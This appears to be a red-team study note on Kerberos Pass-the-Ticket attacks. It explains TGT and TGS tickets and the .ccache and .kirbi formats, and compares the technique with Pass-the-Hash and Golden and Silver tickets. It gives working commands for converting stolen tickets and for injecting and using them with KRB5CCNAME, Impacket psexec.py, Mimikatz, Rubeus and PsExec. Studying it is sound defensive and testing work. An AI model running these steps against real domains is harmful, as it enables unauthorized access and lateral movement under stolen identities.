
**Pass-the-Ticket (PtT)** is a Kerberos attack technique where an attacker obtains a **valid Kerberos ticket** and uses it to authenticate as the ticket's principal **without knowing the account's password**.

The attacker does **not necessarily forge the ticket**. Instead, they reuse a legitimate ticket obtained from another system/session.

```text
Obtain Valid Kerberos Ticket
          ↓
      Import/Inject
          ↓
     Current Session
          ↓
   Kerberos Authentication
          ↓
       Target Service
```

---

# TGT vs TGS

Kerberos tickets commonly encountered during PtT are:

|Ticket|Purpose|
|---|---|
|**TGT**|Used to request service tickets (TGS)|
|**TGS**|Used to authenticate to a specific service|

A stolen **TGT** generally provides more flexibility because it can be used to request additional service tickets while it remains valid.

A stolen **TGS** is limited to the specific service it was issued for.

```text
TGT
 ↓
Request TGS
 ↓
Service

TGS
 ↓
Specific Service
```

---

# Ticket Formats

Kerberos tickets commonly appear in two formats:

|Platform / Format|File|
|---|---|
|Linux MIT Kerberos cache|`.ccache`|
|Windows Kerberos ticket|`.kirbi`

Tickets can be converted between formats when necessary.

Using Impacket's `ticket_converter.py`:
```bash
python ticket_converter.py <INPUT> <OUTPUT>
```

### ccache → kirbi
```bash
python ticket_converter.py \
velociraptor.ccache \
velociraptor.kirbi
```

### kirbi → ccache
```bash
python ticket_converter.py \
velociraptor.kirbi \
velociraptor.ccache
```

Concept:
```text
Linux
.ccache
  ↕
Windows
.kirbi
```

---

# Pass-the-Ticket on Linux

Point `KRB5CCNAME` to the stolen Kerberos cache:
```bash
export KRB5CCNAME=/path/to/ticket.ccache
```

This tells Kerberos-aware applications which credential cache to use.

Check the ticket:
```bash
klist
```

Then use an Impacket tool with Kerberos:
```bash
psexec.py <DOMAIN>/<USER>@<TARGET_FQDN> \
-k -no-pass
```

Important options:

| Option       | Meaning                                 |
| ------------ | --------------------------------------- |
| `-k`         | Use Kerberos authentication             |
| `-no-pass`   | Don't ask for a password                |
| `KRB5CCNAME` | Specifies the Kerberos credential cache |

Concept:
```text
Stolen .ccache
      ↓
KRB5CCNAME
      ↓
Impacket
      ↓
Kerberos Authentication
      ↓
Target Service
```

---

# Pass-the-Ticket on Windows

Mimikatz can inject a `.kirbi` ticket into the current session:
```powershell
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
```

Rubeus:
```powershell
Rubeus.exe ptt /ticket:<TICKET_FILE>
```

For example:
```powershell
Rubeus.exe ptt /ticket:trex.kirbi
```

The ticket is injected into the current logon session.

---

# Verify the Ticket

After importing the ticket:
```powershell
klist
```

You should see the imported Kerberos ticket.

Example concept:
```text
Cached Tickets
    Client: trex
    Server: krbtgt/JURASSIC.PARK
    Encryption: AES256
```

---

# Use the Ticket

After injection, Kerberos-aware tools can authenticate using the imported ticket.

For example:
```powershell
PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

The authentication uses the Kerberos ticket rather than requiring the user's password.

```text
Stolen Ticket
      ↓
Rubeus / Mimikatz
      ↓
Ticket Injection
      ↓
Current Logon Session
      ↓
PsExec / SMB / Other Service
```

---

# PtT vs Pass-the-Hash

These techniques use different authentication material:

|PtT|Pass-the-Hash|
|---|---|
|Uses Kerberos ticket|Uses NTLM hash|
|Targets Kerberos authentication|Targets NTLM authentication|
|`.kirbi` / `.ccache`|NT hash|
|No password required|No password required|

```text
PtT
Kerberos Ticket
      ↓
Kerberos Authentication

PtH
NT Hash
      ↓
NTLM Authentication
```

---

# PtT vs Golden Ticket

|Pass-the-Ticket|Golden Ticket|
|---|---|
|Uses an **existing valid ticket**|Creates a **forged TGT**|
|Requires obtaining a ticket|Requires `krbtgt` secret|
|Doesn't necessarily involve forging|Ticket is forged|
|Limited by the original ticket's scope/lifetime|Can create a TGT with chosen attributes|

```text
PtT
Valid Ticket
    ↓
Inject
    ↓
Use


Golden Ticket
KRBTGT Secret
    ↓
Forge TGT
    ↓
Inject
    ↓
Use
```

---

# PtT vs Silver Ticket

|Pass-the-Ticket|Silver Ticket|
|---|---|
|Uses a stolen valid ticket|Forges a service ticket|
|No service-account secret necessarily required|Requires service account secret/key|
|Uses existing ticket|Creates new ticket|
|Scope depends on stolen ticket|Specific service|

```text
PtT
Stolen TGT/TGS
      ↓
Inject
      ↓
Use


Silver Ticket
Service Account Key
      ↓
Forge TGS
      ↓
Specific Service
```

---

# Important Limitations

Having a Kerberos ticket **does not automatically give administrator privileges**.

Access depends on:
```text
Ticket Identity
      +
Ticket Scope
      +
Ticket Validity
      +
Target Service
      +
Service Authorization
```

A ticket can fail because it is:

- Expired.
- Revoked/invalidated.
- Incorrectly scoped.
- For the wrong service.
- Cryptographically invalid.
- Not authorized for the requested resource.
    

---

# Attack Chain

```text
Compromise / Access Another Session
              ↓
       Obtain Kerberos Ticket
              ↓
       .ccache / .kirbi
              ↓
        Convert if Needed
              ↓
       Import / Inject Ticket
              ↓
       Kerberos Authentication
              ↓
        Access Target Service
```

---

# Key Takeaways

- **PtT = Pass-the-Ticket.**
    
- Uses a **stolen/obtained Kerberos ticket** instead of a password.
    
- A **TGT** can be used to request TGS tickets.
    
- A **TGS** is normally limited to its target service.
    
- Linux commonly uses **`.ccache`**.
    
- Windows commonly uses **`.kirbi`**.
    
- Linux: use `KRB5CCNAME`.
    
- Windows: use `Rubeus ptt` or `Mimikatz kerberos::ptt`.
    
- `klist` can be used to inspect cached tickets.
    
- PtT **does not inherently grant additional privileges** beyond what the ticket and target service authorize.
    
- **PtT reuses a ticket; Golden/Silver Tickets forge tickets.**